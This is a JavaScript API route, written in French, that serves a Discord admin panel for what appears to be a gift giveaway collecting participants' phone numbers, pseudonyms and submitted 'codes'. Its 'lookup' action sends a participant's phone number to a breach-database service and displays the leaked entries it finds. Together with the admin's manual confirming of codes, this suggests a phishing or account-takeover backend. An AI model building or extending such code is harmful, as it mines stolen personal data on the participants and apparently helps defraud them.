import crypto from "crypto";
import {
  adminEntry,
  getParticipation,
  listAdminParticipations,
  updateParticipantCodeStatus,
  updateParticipationStatus
} from "../../../lib/db";
import {
  finalActionComponents,
  sendMessageAdminPanel,
  sendMessagePendingCodes,
  sendMessagePendingEntries
} from "../../../lib/message";
import { lookupInquerelyNumber } from "../../../lib/inquerely";

export const config = {
  api: {
    bodyParser: false
  }
};

const DISCORD_RESPONSE = {
  PONG: 1,
  CHANNEL_MESSAGE_WITH_SOURCE: 4,
  UPDATE_MESSAGE: 7
};

function getDiscordPublicKey() {
  return process.env.DISCORD_PUBLIC_KEY || "";
}

function getDiscordAdminId() {
  return String(process.env.DISCORD_ADMIN_ID || "");
}

async function readRawBody(req) {
  const chunks = [];

  for await (const chunk of req) {
    chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  }

  return Buffer.concat(chunks);
}

function verifyDiscordSignature(rawBody, timestamp, signature) {
  const publicKeyHex = getDiscordPublicKey();

  if (!publicKeyHex || !timestamp || !signature) {
    return false;
  }

  try {
    const publicKey = crypto.createPublicKey({
      key: Buffer.concat([
        Buffer.from("302a300506032b6570032100", "hex"),
        Buffer.from(publicKeyHex, "hex")
      ]),
      format: "der",
      type: "spki"
    });

    return crypto.verify(
      null,
      Buffer.concat([Buffer.from(timestamp), rawBody]),
      publicKey,
      Buffer.from(signature, "hex")
    );
  } catch {
    return false;
  }
}

function interactionMessage(content, ephemeral = true) {
  return {
    type: DISCORD_RESPONSE.CHANNEL_MESSAGE_WITH_SOURCE,
    data: {
      content,
      flags: ephemeral ? 64 : 0,
      allowed_mentions: { parse: [] }
    }
  };
}

function updateMessage(content, components) {
  return {
    type: DISCORD_RESPONSE.UPDATE_MESSAGE,
    data: {
      content,
      components,
      allowed_mentions: { parse: [] }
    }
  };
}

function appendStatus(content, suffix) {
  const base = String(content || "Message Discord").replace(/\n\nStatut final:[\s\S]*$/m, "");
  return content ? `${base}\n\n${suffix}` : suffix;
}

function actorIdFromInteraction(interaction) {
  return String(interaction?.member?.user?.id || interaction?.user?.id || "");
}

function formatInquerelyLookup(lookup) {
  const databases = lookup.databases?.length ? lookup.databases.join(", ") : "Aucune base listée";
  const quota = lookup.quota
    ? `${lookup.quota.remaining ?? "?"}/${lookup.quota.limit ?? "?"} restant`
    : "Non disponible";
  const breachLines = (lookup.breaches || []).slice(0, 3).map((breach) => {
    const entries = (breach.entries || [])
      .flat()
      .slice(0, 4)
      .map((item) => `${item.key}: ${item.value}`)
      .join(" · ");

    return `- ${breach.database}${entries ? ` — ${entries}` : ""}`;
  });

  return [
    "**Lookup Inquerely**",
    "",
    `Numéro: ${lookup.number}`,
    `Bases trouvées: ${lookup.breachCount}`,
    `Entrées OSINT: ${lookup.entriesCount}`,
    `Bases: ${databases}`,
    `Quota: ${quota}`,
    lookup.durationMs ? `Durée: ${lookup.durationMs} ms` : "",
    "",
    breachLines.length ? breachLines.join("\n") : "Aucun détail retourné."
  ].filter(Boolean).join("\n");
}

export default async function handler(req, res) {
  if (req.method !== "POST") {
    res.setHeader("Allow", "POST");
    return res.status(405).json({ error: "Method not allowed" });
  }

  const rawBody = await readRawBody(req);
  const timestamp = req.headers["x-signature-timestamp"];
  const signature = req.headers["x-signature-ed25519"];

  if (!verifyDiscordSignature(rawBody, timestamp, signature)) {
    return res.status(401).json({ error: "Invalid Discord signature." });
  }

  const interaction = JSON.parse(rawBody.toString("utf8") || "{}");

  if (interaction.type === 1) {
    return res.status(200).json({ type: DISCORD_RESPONSE.PONG });
  }

  const adminId = getDiscordAdminId();
  const actorId = actorIdFromInteraction(interaction);

  if (!adminId || actorId !== adminId) {
    return res.status(200).json(interactionMessage("Action non autorisée."));
  }

  const customId = String(interaction.data?.custom_id || "");
  const [action, participationId] = customId.split(":");
  const channelId = interaction.channel_id;

  if (action === "done") {
    return res.status(200).json(interactionMessage("Cette action a déjà été traitée."));
  }

  if (action === "panel") {
    const participations = await listAdminParticipations();
    await sendMessageAdminPanel(channelId, participations);
    return res.status(200).json(interactionMessage("Panel actualisé."));
  }

  if (action === "panel_entries") {
    const participations = await listAdminParticipations();
    await sendMessagePendingEntries(channelId, participations);
    return res.status(200).json(interactionMessage("Inscriptions envoyées."));
  }

  if (action === "panel_codes") {
    const participations = await listAdminParticipations();
    await sendMessagePendingCodes(channelId, participations);
    return res.status(200).json(interactionMessage("Codes envoyés."));
  }

  if (action === "phone") {
    const entry = await getParticipation(participationId);

    if (!entry) {
      return res.status(200).json(interactionMessage("Inscription introuvable."));
    }

    const adminParticipation = adminEntry(entry);
    return res.status(200).json(
      interactionMessage(
        [
          "**Numéro de téléphone**",
          "",
          `Cadeau: ${adminParticipation.giftLabel}`,
          `Pseudo: ${adminParticipation.gamePseudo || "Non fourni"}`,
          `Discord: ${adminParticipation.discordPseudo || "Non fourni"}`,
          `Téléphone: ${adminParticipation.phone || adminParticipation.maskedPhone}`
        ].join("\n"),
        true
      )
    );
  }

  if (action === "lookup") {
    const entry = await getParticipation(participationId);

    if (!entry) {
      return res.status(200).json(interactionMessage("Inscription introuvable."));
    }

    const adminParticipation = adminEntry(entry);

    try {
      const lookup = await lookupInquerelyNumber(adminParticipation.phone);
      return res.status(200).json(interactionMessage(formatInquerelyLookup(lookup), true));
    } catch (error) {
      if (error.code === "INQUERELY_MISSING_KEY") {
        return res.status(200).json(interactionMessage("INQUERELY_API_KEY n'est pas configurée."));
      }

      return res.status(200).json(
        interactionMessage(error.message || "Lookup Inquerely impossible.")
      );
    }
  }

  if (["code_confirm", "code_reject"].includes(action)) {
    const codeStatus = action === "code_confirm" ? "confirmed" : "rejected";

    try {
      const updated = await updateParticipantCodeStatus(
        participationId,
        codeStatus,
        `discord:${actorId}`
      );

      if (!updated) {
        return res.status(200).json(interactionMessage("Inscription introuvable."));
      }

      const label = codeStatus === "confirmed" ? "CODE CONFIRME" : "CODE REFUSE";
      const suffix = codeStatus === "confirmed"
        ? "Statut final: code CONFIRME."
        : "Statut final: code REFUSE.";

      return res.status(200).json(
        updateMessage(
          appendStatus(interaction.message?.content, suffix),
          finalActionComponents(label, codeStatus === "confirmed" ? 3 : 4)
        )
      );
    } catch (error) {
      if (error.code === "CODE_MISSING") {
        return res.status(200).json(interactionMessage("Aucun code à confirmer."));
      }

      throw error;
    }
  }

  const status = action === "confirm" ? "validated" : action === "reject" ? "rejected" : null;

  if (!status || !participationId) {
    return res.status(200).json(interactionMessage("Action invalide."));
  }

  const updated = await updateParticipationStatus(participationId, status, `discord:${actorId}`);

  if (!updated) {
    return res.status(200).json(interactionMessage("Inscription introuvable."));
  }

  const label = status === "validated" ? "VALIDEE" : "REFUSEE";
  const suffix = status === "validated"
    ? "Statut final: inscription VALIDEE."
    : "Statut final: inscription REFUSEE.";

  return res.status(200).json(
    updateMessage(
      appendStatus(interaction.message?.content, suffix),
      finalActionComponents(label, status === "validated" ? 3 : 4)
    )
  );
}
